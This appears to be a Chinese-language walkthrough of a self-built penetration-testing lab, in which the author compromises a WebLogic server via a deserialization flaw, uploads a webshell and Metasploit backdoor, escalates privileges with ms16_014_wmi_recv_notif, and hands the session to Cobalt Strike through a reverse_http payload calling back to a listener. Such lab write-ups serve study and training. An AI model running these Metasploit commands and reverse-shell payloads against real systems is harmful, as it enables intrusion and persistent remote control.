拓补

虚拟网络编辑器配置

服务器配置

进入C:\Oracle\Middleware\user_projects\domains\base_domain运行startWebLogic，一定要以管理员方式运行，否则无法开启服务

外网渗透

nmap扫描发现开启7001端口，对该端口进行目录爆破发现weblogic后台登录页面以及版本号信息，使用反序列化工具测试服务器漏洞

上传webshell连接(注意工具默认上传的是小马，无法连接)。成功连接后上传msf后门，msf上线

权限提升

信息搜集暂时略过，因为我们得到的用户权限很低，所以需要提权以获取更多信息

请注意一定要上传架构一致的后门，否则提权时会报错，例如64位机器不要传32位的

Exploit aborted due to failure: no-target: Session host is x64, but the target is specified as x86

接下来开始漏洞检测：

msf6 exploit(windows/local/payload_inject) > use post/multi/recon/local_exploit_suggester msf6 post(multi/recon/local_exploit_suggester) > set lhost 192.168.111.80 msf6 post(multi/recon/local_exploit_suggester) > set session 1 msf6 post(multi/recon/local_exploit_suggester) > run

结果输出：

[*] Started reverse TCP handler on 192.168.111.128:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. [*] Launching notepad.exe to host the exploit... [+] Process 2184 launched. [*] Injecting exploit into 2184 ... [*] Exploit injected. Injecting payload into 2184... [*] Payload injected. Executing exploit... [*] Exploit completed, but no session was created

漏洞利用

msf6  > use exploit/windows/local/ms16_014_wmi_recv_notif
msf6  > set session 1 # 指定会话
msf6  > run


成功提权：

派生cs：

可以参考以下命令：

use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http #注意64位
set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true
set lhost x.x.x.x               #cobaltstrike监听的ip
set lport 6789                 #cobaltstrike监听的端口 
set session 1                   #这里是获得的session的id
exploit
